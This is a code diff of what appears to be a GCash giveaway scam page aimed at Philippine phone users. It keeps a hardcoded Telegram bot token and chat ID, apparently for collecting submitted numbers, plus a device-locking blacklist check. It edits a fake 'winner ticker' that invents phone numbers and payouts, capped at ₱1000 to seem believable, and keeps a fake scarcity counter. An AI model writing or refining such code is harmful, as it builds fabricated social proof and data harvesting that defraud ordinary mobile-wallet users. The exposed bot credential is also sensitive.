@@ -97,7 +97,6 @@
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
 
-        // --- HARD BAN LOGIC ---
         function showBlockedUI() {
             document.getElementById('modalOverlay').style.display = 'flex';
             document.getElementById('modalBodyContent').innerHTML = `
@@ -134,9 +133,8 @@
             if (phone.length < 11 || !phone.startsWith('09')) return alert("Enter valid 11-digit number.");
             btn.disabled = true; btn.innerHTML = "VERIFYING...";
 
-            // BAN CHECK MULA SA CONFIG.JS
             if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
-                localStorage.setItem("cp_device_locked", "true"); // Lock device permanently
+                localStorage.setItem("cp_device_locked", "true"); 
                 localStorage.removeItem("cp_verified");
                 setTimeout(showBlockedUI, 1200);
                 return;
@@ -153,16 +151,19 @@
             }
         }
 
-        // --- WINNER TICKER WITH GC ICON ---
+        // --- WINNER TICKER WITH GC ICON (FIXED MAX ₱1000) ---
         setInterval(() => {
             const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
             const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
             const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-            const amount = [500, 800, 1000, 1500][Math.floor(Math.random()*4)];
+            
+            // DITO NATIN NILIMIT SA 1000 PABABA
+            const amounts = [100, 150, 200, 300, 500, 800, 1000];
+            const amount = amounts[Math.floor(Math.random() * amounts.length)];
+            
             document.getElementById('winnerEntry').innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="gc_icon.png" class="gc-mini-icon">₱${amount}`;
         }, 3500);
 
-        // --- SCARCITY DECREASE ---
         let count = 88;
         setInterval(() => {
             if(count > 15) {
